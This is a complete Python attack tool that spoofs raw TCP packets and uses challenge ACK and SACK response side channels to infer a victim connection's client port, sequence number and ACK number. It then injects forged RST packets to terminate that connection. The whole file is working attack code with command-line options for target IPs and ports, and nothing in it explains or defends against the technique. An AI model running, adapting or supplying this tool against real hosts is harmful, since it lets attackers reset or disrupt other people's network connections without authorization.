#!/usr/bin/env python3
import socket
import struct
import time
import threading
import argparse
from collections import deque
from copy import deepcopy

# Response types based on packet characteristics
RESPONSE_CHALLENGE_ACK = "challenge_ack"
RESPONSE_SACK = "sack"
RESPONSE_NORMAL = "normal"
RESPONSE_RST = "rst"
RESPONSE_NONE = "none"

class TCPConnectionGuesser:
    def __init__(self, client_ip='127.0.0.1', server_ip='127.0.0.1', server_port=12345,
                 start_port=49152, end_port=65535, step_size=32, packet_repeat=3):
        self.client_ip = client_ip
        self.server_ip = server_ip
        self.server_port = server_port
        
        # Port finding parameters
        self.start_port = start_port
        self.end_port = end_port
        self.step_size = step_size
        self.packet_repeat = packet_repeat
        
        # Results
        self.found_port = -1
        self.found_seq = -1
        self.found_ack = -1
        
        # Statistics
        self.total_packets_sent = 0
        self.total_bytes_sent = 0
        
        # Sniffing
        self.sniff_socket = None
        self.sniffing = False
        self.sniff_thread = None
        self.responses = []
        self.response_lock = threading.Lock()

    def calculate_checksum(self, data):
        """Calculate 16-bit checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += (checksum >> 16)
        return ~checksum & 0xFFFF

    def calculate_tcp_checksum(self, src_ip, dst_ip, tcp_header, payload):
        """Calculate TCP checksum with pseudo header"""
        pseudo_header = struct.pack('!4s4sBBH',
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip),
            0,
            socket.IPPROTO_TCP,
            len(tcp_header) + len(payload)
        )
        
        tcp_data = pseudo_header + tcp_header + payload
        return self.calculate_checksum(tcp_data)

    def tcp_flags_to_int(self, flags):
        """Convert TCP flags string to integer"""
        flag_map = {'F': 0x01, 'S': 0x02, 'R': 0x04, 'P': 0x08, 'A': 0x10, 'U': 0x20, 'E': 0x40, 'C': 0x80}
        value = 0
        for flag in flags:
            if flag in flag_map:
                value |= flag_map[flag]
        return value

    def create_tcp_packet(self, src_port, dst_port, seq=1000, ack=0, flags='S', payload=''):
        """Create complete TCP packet with correct checksum"""
        payload_bytes = payload.encode('utf-8') if isinstance(payload, str) else payload
        
        # Create TCP header with checksum = 0
        tcp_header = struct.pack("!HHLLBBHHH", 
            src_port, dst_port, seq, ack,
            5 << 4,  # Data offset (20 bytes)
            self.tcp_flags_to_int(flags),
            8192,    # Window size
            0,       # Checksum (calculated later)
            0        # Urgent pointer
        )
        
        # Calculate TCP checksum
        tcp_checksum = self.calculate_tcp_checksum(self.client_ip, self.server_ip, tcp_header, payload_bytes)
        
        # Recreate TCP header with correct checksum
        tcp_header = struct.pack("!HHLLBBHHH", 
            src_port, dst_port, seq, ack, 
            5 << 4, self.tcp_flags_to_int(flags), 8192, 
            tcp_checksum, 0
        )
        
        # Create IP header
        total_length = 20 + len(tcp_header) + len(payload_bytes)
        ip_header = struct.pack("!BBHHHBBH4s4s",
            0x45, 0, total_length, 12345, 0, 64, 
            socket.IPPROTO_TCP, 0,
            socket.inet_aton(self.client_ip), socket.inet_aton(self.server_ip)
        )
        
        # Calculate IP checksum
        ip_checksum = self.calculate_checksum(ip_header)
        
        # Recreate IP header with correct checksum
        ip_header = struct.pack("!BBHHHBBH4s4s",
            0x45, 0, total_length, 12345, 0, 64, 
            socket.IPPROTO_TCP, ip_checksum,
            socket.inet_aton(self.client_ip), socket.inet_aton(self.server_ip)
        )
        
        return ip_header + tcp_header + payload_bytes

    def start_sniffing(self):
        """Start sniffing for responses"""
        try:
            self.sniff_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            self.sniff_socket.settimeout(0.1)
        except OSError as e:
            print(f"Warning: Could not create sniff socket: {e}")
            return
        
        self.sniffing = True
        self.sniff_thread = threading.Thread(target=self._sniff_responses)
        self.sniff_thread.daemon = True
        self.sniff_thread.start()

    def _sniff_responses(self):
        """Background thread to capture TCP responses"""
        while self.sniffing:
            try:
                data, addr = self.sniff_socket.recvfrom(1024)
                if len(data) >= 40:  # IP + TCP headers
                    # Parse IP header
                    ip_header = struct.unpack('!BBHHHBBH4s4s', data[:20])
                    src_ip = socket.inet_ntoa(ip_header[8])
                    dst_ip = socket.inet_ntoa(ip_header[9])
                    total_len = ip_header[2]
                    
                    # Check if response is from our target
                    if src_ip == self.server_ip and dst_ip == self.client_ip:
                        # Parse TCP header
                        tcp_header = struct.unpack('!HHLLBBHHH', data[20:40])
                        src_port = tcp_header[0]
                        dst_port = tcp_header[1]
                        seq_num = tcp_header[2]
                        ack_num = tcp_header[3]
                        flags = tcp_header[5]
                        
                        if src_port == self.server_port:
                            response_info = {
                                'timestamp': time.time(),
                                'size': len(data),
                                'total_len': total_len,
                                'src_port': src_port,
                                'dst_port': dst_port,
                                'seq': seq_num,
                                'ack': ack_num,
                                'flags': flags,
                                'type': self._classify_response(len(data), flags)
                            }
                            
                            with self.response_lock:
                                self.responses.append(response_info)
                                
            except socket.timeout:
                continue
            except Exception as e:
                if self.sniffing:
                    print(f"[DEBUG] Sniff error: {e}")
                break

    def _classify_response(self, packet_size, flags):
        """Classify response type based on size and flags"""
        # RST response
        if flags & 0x04:
            return RESPONSE_RST
            
        # Challenge ACK (smaller response, usually just ACK)
        if packet_size == 52:  # IP(20) + TCP(20) + minimal data
            return RESPONSE_CHALLENGE_ACK
            
        # SACK response (larger due to SACK options)  
        if packet_size == 64:  # IP(20) + TCP(32) + SACK options
            return RESPONSE_SACK
            
        # Normal response
        if packet_size > 40:
            return RESPONSE_NORMAL
            
        return RESPONSE_NONE

    def stop_sniffing(self):
        """Stop sniffing thread"""
        self.sniffing = False
        if self.sniff_socket:
            self.sniff_socket.close()
        if self.sniff_thread and self.sniff_thread.is_alive():
            self.sniff_thread.join(timeout=1)

    def send_packets(self, packet_list):
        """Send a list of TCP packets"""
        try:
            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            for packet in packet_list:
                raw_socket.sendto(packet, (self.server_ip, 0))
                self.total_packets_sent += 1
                self.total_bytes_sent += len(packet)
                
        except OSError as e:
            print(f"Send error: {e}")
        finally:
            raw_socket.close()

    def clear_responses(self):
        """Clear collected responses"""
        with self.response_lock:
            self.responses.clear()

    def get_responses_by_type(self, response_type, since_time=None):
        """Get responses of specific type"""
        with self.response_lock:
            filtered = []
            for resp in self.responses:
                if resp['type'] == response_type:
                    if since_time is None or resp['timestamp'] >= since_time:
                        filtered.append(resp)
            return filtered

    def find_port(self):
        """Find active connection port using binary search approach"""
        print("=" * 60)
        print("PHASE 1: PORT DISCOVERY")
        print("=" * 60)
        
        current_port = self.start_port
        candidate_deque = deque()
        port_range_end = False
        
        while current_port <= self.end_port:
            # Create port range to test
            port_list = list(range(current_port, min(current_port + self.step_size, self.end_port + 1)))
            current_port += self.step_size
            
            if current_port > self.end_port:
                port_range_end = True
            
            print(f"[*] Testing port range: {port_list[0]} - {port_list[-1]}")
            
            # Clear previous responses
            self.clear_responses()
            start_time = time.time()
            
            # Send SYN packets to all ports in range
            packets = []
            for port in port_list:
                for _ in range(self.packet_repeat):
                    packet = self.create_tcp_packet(port, self.server_port, flags='S')
                    packets.append(packet)
            
            self.send_packets(packets)
            time.sleep(0.5)  # Wait for responses
            
            # Check for challenge ACK responses (indicating active connection)
            challenge_responses = self.get_responses_by_type(RESPONSE_CHALLENGE_ACK, start_time)
            
            if challenge_responses:
                print(f"[+] Found {len(challenge_responses)} challenge ACK responses!")
                
                # Binary search within this range
                suspicious_ports = deepcopy(port_list)
                
                while len(suspicious_ports) > 1:
                    mid = len(suspicious_ports) // 2
                    left_ports = suspicious_ports[:mid]
                    right_ports = suspicious_ports[mid:]
                    
                    # Test left half
                    self.clear_responses()
                    left_start = time.time()
                    
                    packets = []
                    for port in left_ports:
                        for _ in range(self.packet_repeat):
                            packet = self.create_tcp_packet(port, self.server_port, flags='S')
                            packets.append(packet)
                    
                    self.send_packets(packets)
                    time.sleep(0.3)
                    
                    left_responses = self.get_responses_by_type(RESPONSE_CHALLENGE_ACK, left_start)
                    
                    # Test right half
                    self.clear_responses()
                    right_start = time.time()
                    
                    packets = []
                    for port in right_ports:
                        for _ in range(self.packet_repeat):
                            packet = self.create_tcp_packet(port, self.server_port, flags='S')
                            packets.append(packet)
                    
                    self.send_packets(packets)
                    time.sleep(0.3)
                    
                    right_responses = self.get_responses_by_type(RESPONSE_CHALLENGE_ACK, right_start)
                    
                    # Choose the half with responses
                    if left_responses:
                        suspicious_ports = left_ports
                        print(f"[+] Narrowed down to left half: {len(left_ports)} ports")
                    elif right_responses:
                        suspicious_ports = right_ports
                        print(f"[+] Narrowed down to right half: {len(right_ports)} ports")
                    else:
                        print("[-] No responses in either half, taking first port")
                        suspicious_ports = [suspicious_ports[0]]
                        break
                
                self.found_port = suspicious_ports[0]
                print(f"[+] FOUND CLIENT PORT: {self.found_port}")
                return True
                
            if port_range_end:
                break
        
        print("[-] Port discovery failed")
        return False

    # Alternative approach with more strategic sequence testing
    def test_sack_sequences_strategic(self, n=5):
        """
        Test n strategically chosen sequence numbers to find one that triggers SACK
        Uses different strategies for better coverage
        
        Args:
            n (int): Number of sequence slices to test (default: 5)
        """
        sack_found = False
        max_seq = (1 << 32) - 1
        test_seq = None
        
        # Generate n different test sequences using various strategies
        test_sequences = []
        
        for i in range(n):
            if i == 0:
                # Start from 0
                test_seq = 0
            elif i == 1:
                # Middle of sequence space
                test_seq = max_seq // 2
            elif i == 2:
                # Near the end
                test_seq = max_seq - 1000
            else:
                # Evenly distributed across remaining space
                slice_size = max_seq // n
                test_seq = i * slice_size
            
            test_sequences.append(test_seq)
        
        for i, test_seq in enumerate(test_sequences):
            self.clear_responses()
            start_time = time.time()
            
            packets = []
            for _ in range(4):  # Multiple attempts
                packet = self.create_tcp_packet(
                    self.found_port, self.server_port, 
                    seq=test_seq, flags='A', payload='ABC'
                )
                packets.append(packet)
            
            self.send_packets(packets)
            time.sleep(0.2)
            
            sack_responses = self.get_responses_by_type(RESPONSE_SACK, start_time)
            
            if sack_responses:
                print(f"[+] Found SACK-triggering sequence: {test_seq} (test {i+1}/{n})")
                sack_found = True
                break
            else:
                print(f"[-] No SACK response for sequence: {test_seq} (test {i+1}/{n})")
        
        return sack_found, test_seq

    def find_sequence_number(self):
        """Find acceptable sequence number using binary search"""
        print("\n" + "=" * 60)
        print("PHASE 2: SEQUENCE NUMBER DISCOVERY") 
        print("=" * 60)
        
        if self.found_port == -1:
            print("[-] Need to find port first")
            return False
        
        # First, find a sequence number that triggers SACK responses
        print("[*] Finding initial sequence number that triggers SACK...")
        
        test_seq = 0
        sack_found = False
        
        sack_found, test_seq = self.test_sack_sequences_strategic(n=15)
        
        if not sack_found:
            # If no SACK found, adjust the sequence number
            test_seq += (1 << 31)
            if test_seq >= (1 << 32):
                test_seq -= (1 << 32)
            print(f"[*] No SACK found, trying adjusted sequence: {test_seq}")
        
        # Binary search for the exact boundary
        print("[*] Performing binary search for sequence boundary...")
        
        right_bound = test_seq
        left_bound = right_bound - (1 << 31)
        found_boundary = -1
        
        iterations = 0
        max_iterations = 32
        
        while right_bound >= left_bound and iterations < max_iterations:
            iterations += 1
            mid = int((right_bound + left_bound) / 2)
            seq_mid = mid if mid >= 0 else mid + (1 << 32)
            
            print(f"[*] Testing sequence {seq_mid} (iteration {iterations})")
            
            self.clear_responses()
            start_time = time.time()
            
            packets = []
            for _ in range(4):
                packet = self.create_tcp_packet(
                    self.found_port, self.server_port,
                    seq=seq_mid, flags='A', payload='ABC'
                )
                packets.append(packet)
            
            self.send_packets(packets)
            time.sleep(0.2)
            
            sack_responses = self.get_responses_by_type(RESPONSE_SACK, start_time)
            
            if sack_responses:
                found_boundary = mid
                right_bound = mid - 1
                print(f"[+] SACK response at {seq_mid}, narrowing right")
            else:
                left_bound = mid + 1
                print(f"[-] No SACK at {seq_mid}, narrowing left")
        
        if found_boundary != -1:
            boundary_seq = found_boundary if found_boundary >= 0 else found_boundary + (1 << 32)
            self.found_seq = (boundary_seq + (1 << 31)) & ((1 << 32) - 1)
            print(f"[+] FOUND SEQUENCE NUMBER: {self.found_seq}")
            return True
        
        print("[-] Sequence number discovery failed")
        return False

    def find_ack_number(self):
        """Find acceptable ACK number using binary search"""
        print("\n" + "=" * 60)
        print("PHASE 3: ACK NUMBER DISCOVERY")
        print("=" * 60)
        
        if self.found_port == -1 or self.found_seq == -1:
            print("[-] Need port and sequence number first")
            return False
        
        # Find an ACK that triggers challenge ACK
        print("[*] Finding ACK that triggers challenge ACK...")
        
        ack_list = [0]
        for i in range(3):
            ack_list.append(ack_list[-1] + (1 << 30))
        
        challenge_ack_found = None
        
        for test_ack in ack_list:
            challenge_count = 0
            
            for attempt in range(5):
                self.clear_responses()
                start_time = time.time()
                
                packets = []
                for _ in range(4):
                    packet = self.create_tcp_packet(
                        self.found_port, self.server_port,
                        seq=self.found_seq, ack=test_ack, flags='A'
                    )
                    packets.append(packet)
                
                self.send_packets(packets)
                time.sleep(0.15)
                
                challenge_responses = self.get_responses_by_type(RESPONSE_CHALLENGE_ACK, start_time)
                
                if challenge_responses:
                    challenge_count += 1
                    if challenge_count >= 2:  # Consistent challenge ACKs
                        challenge_ack_found = test_ack
                        break
            
            if challenge_ack_found is not None:
                print(f"[+] Found challenge ACK trigger: {challenge_ack_found}")
                break
        
        if challenge_ack_found is None:
            print("[-] Could not find challenge ACK trigger")
            return False
        
        # Binary search for ACK window boundary
        print("[*] Performing binary search for ACK boundary...")
        
        right_bound = challenge_ack_found
        left_bound = right_bound - (1 << 31)
        found_boundary = -1
        
        iterations = 0
        max_iterations = 32
        
        while right_bound >= left_bound and iterations < max_iterations:
            iterations += 1
            mid = int((right_bound + left_bound) / 2)
            ack_mid = mid if mid >= 0 else mid + (1 << 32)
            
            print(f"[*] Testing ACK {ack_mid} (iteration {iterations})")
            
            challenge_count = 0
            for attempt in range(5):
                self.clear_responses()
                start_time = time.time()
                
                packets = []
                for _ in range(4):
                    packet = self.create_tcp_packet(
                        self.found_port, self.server_port,
                        seq=self.found_seq, ack=ack_mid, flags='A'
                    )
                    packets.append(packet)
                
                self.send_packets(packets)
                time.sleep(0.15)
                
                challenge_responses = self.get_responses_by_type(RESPONSE_CHALLENGE_ACK, start_time)
                
                if challenge_responses:
                    challenge_count += 1
                    if challenge_count >= 2:
                        break
            
            if challenge_count >= 2:
                found_boundary = mid
                right_bound = mid - 1
                print(f"[+] Challenge ACK at {ack_mid}, narrowing right")
            else:
                left_bound = mid + 1
                print(f"[-] No challenge ACK at {ack_mid}, narrowing left")
        
        if found_boundary != -1:
            boundary_ack = found_boundary if found_boundary >= 0 else found_boundary + (1 << 32)
            self.found_ack = (boundary_ack + (1 << 31)) & ((1 << 32) - 1)
            print(f"[+] FOUND ACK NUMBER: {self.found_ack}")
            return True
        
        print("[-] ACK number discovery failed")
        return False

    def send_rst_attack(self, count=1, seq_variation=True):
        """Send RST packets to terminate the connection"""
        if self.found_port == -1 or self.found_seq == -1 or self.found_ack == -1:
            print("[-] Complete connection parameters not found - cannot send RST")
            return False
        
        print("\n" + "=" * 60)
        print("SENDING RST ATTACK")
        print("=" * 60)
        print(f"Target Connection: {self.client_ip}:{self.found_port} -> {self.server_ip}:{self.server_port}")
        print(f"Using Client SEQ: {self.found_seq}, Client ACK: {self.found_ack}")
        print(f"Sending {count} RST packet(s) from CLIENT to SERVER...")
        
        packets = []
        
        if seq_variation:
            # Send RST packets with slight sequence number variations to increase success rate
            for i in range(count):
                # Try different sequence numbers around the found client sequence value
                seq_offset = self.found_seq + (i - count//2)
                if seq_offset < 0:
                    seq_offset += (1 << 32)
                elif seq_offset >= (1 << 32):
                    seq_offset -= (1 << 32)
                
                # Create RST packet from CLIENT to SERVER using client's sequence number
                rst_packet = self.create_tcp_packet(
                    self.found_port, self.server_port,
                    seq=seq_offset, ack=0, flags='R'
                )
                packets.append(rst_packet)
        else:
            # Send exact RST packets
            for i in range(count):
                # RST from CLIENT to SERVER using the discovered client sequence
                rst_packet = self.create_tcp_packet(
                    self.found_port, self.server_port,
                    seq=self.found_seq, ack=0, flags='R'
                )
                packets.append(rst_packet)
        
        # Send all RST packets
        self.send_packets(packets)
        
        print(f"[+] Sent {len(packets)} RST packets from client to server")
        print("[+] Connection should be terminated!")
        print("=" * 60)
        
        return True

    def run_attack(self, send_rst=True, rst_count=5):
        """Run the complete attack sequence"""
        print("TCP CONNECTION PARAMETER GUESSER & RST ATTACK")
        print("=" * 60)
        print(f"Target: {self.client_ip} -> {self.server_ip}:{self.server_port}")
        print(f"Port range: {self.start_port} - {self.end_port}")
        print("=" * 60)
        
        start_time = time.time()
        
        # Start sniffing
        self.start_sniffing()
        time.sleep(0.5)
        
        try:
            # Phase 1: Find port
            if not self.find_port():
                return False
            
            # Phase 2: Find sequence number  
            if not self.find_sequence_number():
                return False
            
            # Phase 3: Find ACK number
            if not self.find_ack_number():
                return False
            
            # Success - parameters found!
            end_time = time.time()
            
            print("\n" + "=" * 60)
            print("CONNECTION PARAMETERS DISCOVERED!")
            print("=" * 60)
            print(f"Client IP: {self.client_ip}")
            print(f"Client Port: {self.found_port}")
            print(f"Server IP: {self.server_ip}")
            print(f"Server Port: {self.server_port}")
            print(f"Sequence Number: {self.found_seq}")
            print(f"ACK Number: {self.found_ack}")
            print("=" * 60)
            print(f"Discovery took: {end_time - start_time:.2f} seconds")
            print(f"Total packets sent: {self.total_packets_sent}")
            print(f"Total bytes sent: {self.total_bytes_sent}")
            
            # Phase 4: Send RST attack
            if send_rst:
                time.sleep(1)  # Brief pause before attack
                self.send_rst_attack(count=rst_count, seq_variation=True)
            
            return True
            
        finally:
            self.stop_sniffing()

def main():
    parser = argparse.ArgumentParser(description='TCP Connection Parameter Guesser with RST Attack')
    parser.add_argument('--client-ip', default='127.0.0.1', help='Client IP address')
    parser.add_argument('--server-ip', default='127.0.0.1', help='Server IP address')
    parser.add_argument('--server-port', type=int, default=12345, help='Server port')
    parser.add_argument('--start-port', type=int, default=49152, help='Start port range')
    parser.add_argument('--end-port', type=int, default=65535, help='End port range')
    parser.add_argument('--step-size', type=int, default=16, help='Port scan step size')
    parser.add_argument('--packet-repeat', type=int, default=1, help='Packets per test')
    parser.add_argument('--no-rst', action='store_true', help='Skip RST attack after discovery')
    parser.add_argument('--rst-count', type=int, default=5, help='Number of RST packets to send')
    
    args = parser.parse_args()
    
    guesser = TCPConnectionGuesser(
        client_ip=args.client_ip,
        server_ip=args.server_ip,
        server_port=args.server_port,
        start_port=args.start_port,
        end_port=args.end_port,
        step_size=args.step_size,
        packet_repeat=args.packet_repeat
    )
    
    try:
        success = guesser.run_attack(
            send_rst=not args.no_rst, 
            rst_count=args.rst_count
        )
        
        if success:
            print("\n[+] Attack completed successfully!")
        else:
            print("\n[-] Attack failed")
            
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        guesser.stop_sniffing()
    except Exception as e:
        print(f"[!] Error: {e}")
        guesser.stop_sniffing()

if __name__ == "__main__":
    main()